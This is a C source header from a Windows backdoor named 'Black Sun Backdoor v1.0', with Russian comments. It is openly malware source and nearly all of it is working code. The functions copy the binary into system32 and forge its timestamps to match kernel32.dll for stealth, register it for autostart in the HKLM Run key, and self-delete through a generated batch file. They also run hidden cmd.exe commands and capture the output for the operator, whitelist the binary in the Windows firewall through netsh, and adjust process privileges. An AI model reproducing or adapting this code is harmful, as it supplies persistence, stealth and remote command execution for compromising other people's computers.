/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [functions.h]
 *      функции для работы с системой (установка в систему, самоудаление 
 *      и т.д)
 *  ---------------------------------------------------------------------
 */
 
// ----------------------- [ создание потока ] ----------------------- //

static HANDLE WINAPI StartThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID param)
{
    DWORD lpThreadId; 
    return CreateThread(NULL, NULL, lpStartAddress, param, NULL, &lpThreadId);
}

// --------------- [ Прописывание себя в реестре и самоудаление из реестра ] ---------------- //

static DWORD WINAPI AddSelfToRun(char *mode)
{
	HKEY hkey, zhkey;
	char str[256], sysbuf[256], myname[256], kernl[256];
	HANDLE hTimeFile;
	FILETIME aFileTime, bFileTime, cFileTime;
	GetModuleFileName(GetModuleHandle(NULL), str, 256);

	GetSystemDirectory(sysbuf, 256);
	lstrcpy(myname, sysbuf); 
	lstrcat(myname, "\\"); 
	lstrcat(myname, EXENAME);

    if(lstrcmp(mode,"addtorun")==0) // прописываем себя в автозагрузку
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE,&hkey)==ERROR_SUCCESS)
			{
			 // получаем дату создания kernel32.dll
				lstrcpy(kernl, sysbuf); lstrcat(kernl, "//");  lstrcat(kernl, KERNEL32_DLL);
				hTimeFile = CreateFile(kernl, GENERIC_READ, FILE_SHARE_READ, 0, 
											  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		  
				if (hTimeFile != INVALID_HANDLE_VALUE) 
				{
					GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile);
				}

				CopyFile(str, myname, FALSE);
				
				hTimeFile = CreateFile(myname, GENERIC_WRITE, FILE_SHARE_WRITE, 0, 
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
							
				// устанавливаем себе дату создания kernel32.dll, чтобы меньше светиться в том случае,
				// если сплайсинг работать не будет (например, загрузка ОС в Safe Mode).

				if (hTimeFile != INVALID_HANDLE_VALUE) 
				{
					SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile);
				}

				// пишем себя в реестр
				if (RegSetValueEx(hkey, REGNAME, 0, REG_SZ, myname, lstrlen(myname)) == ERROR_SUCCESS);
				{
					RegCloseKey(hkey);
				}
			}
	}
	else if(lstrcmp(mode, "killmyself")==0) // удаляемся из автозагрузки
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE,&zhkey)==ERROR_SUCCESS)
			{
				RegDeleteValue(zhkey, REGNAME);
				RegCloseKey(zhkey);
			}
	}
	return 0;
}

// ----------------------- [ самоудаление через создание .bat ] ----------------------- //

// Функция самоудаления с помощью .bat-файла :). Ламерство :)) Альтернативным способом 
// можно юзать инжект в другой процесс и от туда создать поток на самоудаление просто с
// помощью DeleteFile :) Потом переделаю.
// Суть же этого метода заключается в том, что создается батник в папке system32 следующего вида:
// ---- [ self.bat ] ---- 
//  @ECHO off
//  :try
//		DEL C:\WINDOWS\system32\blacksun.exe
//  GOTO try
//		DEL C:\WINDOWS\system32\self.bat
// ---- [ self.bat ] ---- 
// При запуске он пытается удалить себя и сам бэкдор до тех пор, пока не сделает это.
// В это время бэкдор просто завершает свой процесс, а батник удаляет и себя и бэкдор.

static DWORD WINAPI DeleteSelfWithBat()
{
	DWORD dwSz;
	HANDLE hFile;
	char szSelfBatDel[256], szSelfName[256];
	char szTemp[256];
	GetModuleFileName(GetModuleHandle(NULL), szSelfName, sizeof(szSelfName));

     GetSystemDirectory(szSelfBatDel, 256);
     lstrcat(szSelfBatDel, "\\"); 
	 lstrcat(szSelfBatDel, SELFDEL_BAT);

	hFile = CreateFile(szSelfBatDel, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
	    ZeroMemory (&szTemp, sizeof(szTemp));
		
	    lstrcpy(szTemp, "@ECHO off\r\n:try\r\nDEL ");
	    lstrcat(szTemp, &szSelfName);
	    lstrcat(szTemp,"\r\nIF EXIST ");
	    lstrcat(szTemp, &szSelfName);
	    lstrcat(szTemp, " GOTO try\r\n");
	    lstrcat(szTemp, "DEL ");
	    lstrcat(szTemp,  &szSelfBatDel);	

		dwSz = sizeof(szTemp);
		WriteFile(hFile, szTemp, dwSz, &dwSz, NULL);
		CloseHandle(hFile);
    	WinExec(szSelfBatDel, SW_HIDE);
		Sleep(100);
		ExitProcess(0); 
	}

	return 0; 
}

static DWORD WINAPI DeleteSelfFirstTime(LPVOID lpParam) 
{
	DeleteSelfWithBat();
	return 0;
}

// ----------------------- [ выполнение команд с помощью cmd.exe ] ----------------------- //

static DWORD WINAPI ExecuteCMD(char * command)
{
		SECURITY_ATTRIBUTES sec;
		PROCESS_INFORMATION pi;
        STARTUPINFO si;
		HANDLE hOutR, hOutW;
		DWORD BTAvail;
		char * Result = NULL;
		char * cmdline = NULL;
		char cmdpath[256];
		OSVERSIONINFO OSVersionInfo;
		DWORD Read = 0;

			fZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			fZeroMemory(&sec, sizeof(SECURITY_ATTRIBUTES));
			sec.nLength = sizeof(SECURITY_ATTRIBUTES);
			sec.bInheritHandle = TRUE;
			sec.lpSecurityDescriptor = NULL;
	
	if (CreatePipe(&hOutR, &hOutW, &sec, 0)) 
	{
				fZeroMemory(&si, sizeof(STARTUPINFO));
				si.cb = sizeof(STARTUPINFO);
				si.hStdOutput = hOutW;
				si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
				si.wShowWindow = SW_HIDE;

			cmdline = (char *) GlobalAlloc(GMEM_FIXED, (7 + lstrlen(command)));
			lstrcat(lstrcpy(cmdline, " /a /c "), command);

			OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
			GetVersionEx (&OSVersionInfo);

			if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
			{
				GetEnvironmentVariable(COMSPEC, cmdpath, 2048);
			}

		if (CreateProcess(cmdpath, cmdline, &sec, &sec, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			PeekNamedPipe (hOutR, NULL, 0, NULL, &BTAvail, NULL);
				if (BTAvail > 0)
				{
					Result = (char *) GlobalAlloc(GMEM_FIXED, BTAvail + 1);
					ReadFile(hOutR, Result, BTAvail, &Read, NULL);
					Result[BTAvail] = '\0';
					OemToChar(Result, Result);
					if(lstrlen(Result) > 0){	return Result; } 
					else { return MSG_CMDEXECUTED; }
				}

		}
}
	return 0;
}

// ----------------------- [ спрятать/показать окно ] ----------------------- //

static DWORD WINAPI SetWindowStatus(HWND hWnd, char *mode) 
{
		if (lstrcmp(mode, "show")==0)
		{
			ShowWindow(hWnd, SW_SHOW);
		}
		else if (lstrcmp(mode, "hide")==0)
		{
			ShowWindow(hWnd, SW_HIDE); 
		}
	return 0; 
}

// ------------------ [ добавлние самого себя в netsh как доверенное приложение ] ------------------ //

// Недавно вот попался мне трой в руки, продизасмив его, я увидел там эту старую,
// но полезную фичу. Решил добавить и сюда. Самодобавление в доверенные приложения файрвола
// NetSH (стандартная виндовский файр). Просто выполняется команда:
// netsh firewall set allowedprogram C:\WINDOWS\system32\blacksun.exe enable

static DWORD WINAPI NetSHFirewallReg()
{
	char fireexec[256], my_path[256];
	GetModuleFileName(0, my_path, 256);
	
		lstrcpy(fireexec, NETSH_ADD_1);
		lstrcat(fireexec,  my_path);
		lstrcat(fireexec, NETSH_ADD_2); 
		
	WinExec(fireexec, SW_HIDE);
	return 0; 
}

// ------------------ [ получение каких-либо привелегий ] ------------------ //

// Получение привелегий процесса, например, привелегий отладчика или shutdown-привелегий

static BOOL SetPrivilege(char* SeNamePriv, BOOL EnableTF)
{
   HANDLE hToken;
   LUID SeValue;
   TOKEN_PRIVILEGES tp;

   if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
   {
	return FALSE;
   }
   
   if (!LookupPrivilegeValue(NULL, SeNamePriv, &SeValue)) 
   {
      CloseHandle(hToken);
      return FALSE;
   }
   
   tp.PrivilegeCount = 1;
   tp.Privileges[0].Luid = SeValue;
   tp.Privileges[0].Attributes = EnableTF ? SE_PRIVILEGE_ENABLED : 0;
   
   AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

   CloseHandle(hToken);
   return TRUE;
}